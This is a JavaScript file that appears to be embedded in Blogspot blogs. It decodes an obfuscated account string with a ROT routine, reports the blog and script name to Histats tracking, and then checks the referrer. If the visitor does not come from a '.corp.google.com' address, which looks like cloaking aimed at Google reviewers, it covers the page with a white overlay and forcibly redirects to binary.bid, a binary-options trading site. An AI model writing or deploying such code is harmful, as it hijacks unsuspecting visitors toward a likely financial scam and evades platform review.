function ord (string) {
  //  discuss at: http://locutus.io/php/ord/
  // original by: Kevin van Zonneveld (http://kvz.io)
  // bugfixed by: Onno Marsman (https://twitter.com/onnomarsman)
  // improved by: Brett Zamir (http://brett-zamir.me)
  //    input by: incidence
  //   example 1: ord('K')
  //   returns 1: 75
  //   example 2: ord('\uD800\uDC00'); // surrogate pair to create a single Unicode character
  //   returns 2: 65536

  var str = string + ''
  var code = str.charCodeAt(0)

  if (code >= 0xD800 && code <= 0xDBFF) {
    // High surrogate (could change last hex to 0xDB7F to treat
    // high private surrogates as single characters)
    var hi = code
    if (str.length === 1) {
      // This is just a high surrogate with no following low surrogate,
      // so we return its value;
      return code
      // we could also throw an error as it is not a complete character,
      // but someone may want to know
    }
    var low = str.charCodeAt(1)
    return ((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000
  }
  if (code >= 0xDC00 && code <= 0xDFFF) {
    // Low surrogate
    // This is just a low surrogate with no preceding high surrogate,
    // so we return its value;
    return code
    // we could also throw an error as it is not a complete character,
    // but someone may want to know
  }

  return code
}

function str_rot(s, n) {
	var r = "";
    var letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    var n = n % 26;
	
    for (i = 0, l = s.length ; i < l; i++) {
        c = s[i];
        if (c >= 'a' && c <= 'z') {
            r += letters[(ord(c) - 71 + n) % 26];
        } else if (c >= 'A' && c <= 'Z') {
            r += letters[(ord(c) - 39 + n) % 26 + 26];
        }
    }
    return r;
}


// CSS Load
/**
var head  = document.getElementsByTagName('head')[0];
var link  = document.createElement('link');
link.rel  = 'stylesheet';
link.type = 'text/css';
link.href = 'https://raw.githack.com/seebinary/quotex/main/tingle.css';
link.media = 'all';
head.appendChild(link);
**/

var binarybid_url = 'https://www.binary.bid';
var banner_url = binarybid_url;
var banner_img = 'https://raw.githack.com/seebinary/quotex/main/forex.jpg';

const regex_username = /\/\/([a-zA-Z0-9\-+]+)/;

var blog_url = regex_username.exec(ab_blog_url)[1]+'.blogspot.com';

var scripts = document.getElementsByTagName( "script" ) ;
var currentScriptUrl = ( document.currentScript || scripts[scripts.length - 1] ).src ;
var scriptName = currentScriptUrl.length > 0 ? currentScriptUrl : scripts[scripts.length-1].baseURI.split( "/" ).pop() ;
scriptName = scriptName.split( "/" ).pop() ;


// Hitstat
if(!Histats_variables){var Histats_variables=[];}

if( typeof(ab_account) === "string"){
	var ab_account_decode = str_rot(ab_account,-5555);
}
else{
	var ab_account_decode = "none";
}

if( !typeof(scriptName) == "undefined"){
	scriptName = "none";
}

Histats_variables.push(scriptName,ab_account_decode);
Histats_variables.push(ab_account_decode,blog_url);
Histats_variables.push("tags",scriptName);

var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,4249835,4,0,0,0,00010000']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();

var referrer = document.referrer.split( '/' );;
var hostname = window.location.hostname;
hostname = hostname.toLowerCase();
var referrer_hostname = document.referrer.split('/')[2];

var url_iframe = binarybid_url;

if(document.referrer.indexOf(".corp.google.com") == -1){
	var img_loading = document.createElement("img");
	img_loading.setAttribute("id", "iframe_loading");
	img_loading.src = 'https://i.stack.imgur.com/h6viz.gif';
	img_loading.style.cssText = 'z-index:999988;'
	var div_loading = document.createElement("div");
	div_loading.style.cssText = 'position:fixed;width:100%;height:100%;z-index:999987;background:#ffffff;top:0px;text-align:center';
	div_loading.appendChild(img_loading);
	document.getElementsByTagName('html')[0].appendChild(div_loading);

	window.location = url_iframe;
}
